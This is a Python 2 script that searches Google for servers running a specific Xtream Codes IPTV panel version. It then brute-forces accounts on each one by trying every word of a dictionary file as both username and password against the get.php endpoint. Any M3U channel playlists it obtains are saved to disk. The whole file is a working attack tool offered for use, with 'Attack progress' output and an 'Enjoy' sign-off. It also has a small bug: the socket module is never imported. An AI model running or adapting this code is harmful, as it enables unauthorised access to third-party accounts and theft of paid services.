#!/usr/bin/python

import os
import sys
import google
import urllib2
import argparse
import warnings
from urlparse import urlparse
warnings.filterwarnings("ignore")
reload(sys)  
sys.setdefaultencoding('utf8')

outputDir = "output"

parsedUrls = []
basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
searchString = "\"Xtream Codes v1.0.59.5 Copyright 2014-2015\""

parser = argparse.ArgumentParser()
parser.add_argument('-d', '--dictionary', help="Dictionary filename", required=True)
parser.add_argument('-s', '--servers', help="Number of target servers", required=True)
parser.add_argument('-l', '--language', help="Preferred language (en, ru, es, ..)", required=True)
args = parser.parse_args()

print "Language           : " + args.language
print "Dictionary         : " + args.dictionary

with open(args.dictionary) as f:
    rows = f.readlines()
        
with open(args.dictionary) as g:
    fileLength = len(g.readlines())
    print "Words in dictionary:" , fileLength

print "Looking for", args.servers, "IPTV servers..."
    
# Google Search 
counter = 1
for url in google.search(searchString, lang=args.language, num=int(args.servers), stop=1):
    found = 0
    pointer = 1
    print "[", counter, "] Found server at: " + url
    parsed = urlparse(url)
    newURL = parsed.scheme + "://" + parsed.netloc
    parsedUrls.append(newURL)
    
    print "[", counter, "] Scanning: " + newURL + " (this might take a long time, be patient)"
        
    for row in rows:
        progress = float(pointer) / float(fileLength) * 100
        sys.stdout.write("Attack progress: %d%% (%d/%d)  \r" % (progress, pointer, fileLength) )
        sys.stdout.flush()
        pointer += 1
        try:
            opener = urllib2.build_opener()
            opener.addheaders = [('User-agent', 'Mozilla/5.0')]
            response = opener.open(newURL + basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()), timeout = 10)
            fetched = response.read()
            # IF the fetched content is not empty
            # we build the dedicated .m3u file
            if len(fetched) > 0:
                newPath = outputDir + "/" + args.language + "/" + url.replace("http://", "")
                if os.path.exists(newPath) is False:
                    os.makedirs(newPath)
                outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
                outputFile.write(fetched)
                outputFile.close()            
                found += 1
                counter += 1
        except urllib2.HTTPError, e:
            print "[", counter, "] Ops, HTTPError exception here. Cannot fetch the current URL " + newURL + " (" + str(e.code) + ")"
            counter += 1
            break
        except urllib2.URLError, e:
            print "[", counter, "] Ops, the URL seems broken." + str(e.reason)# Remove the current used url in order to avoid to parse it again
            counter += 1
            break
        except socket.timeout:
            print "[", counter, "] Socket timeout."
            counter += 1
            break
    #print newURL + ": all done."
    parsedUrls.remove(newURL)
    print "[", counter, "] Accounts discovered on " + newURL + ":", found
    
print "All done. Enjoy."    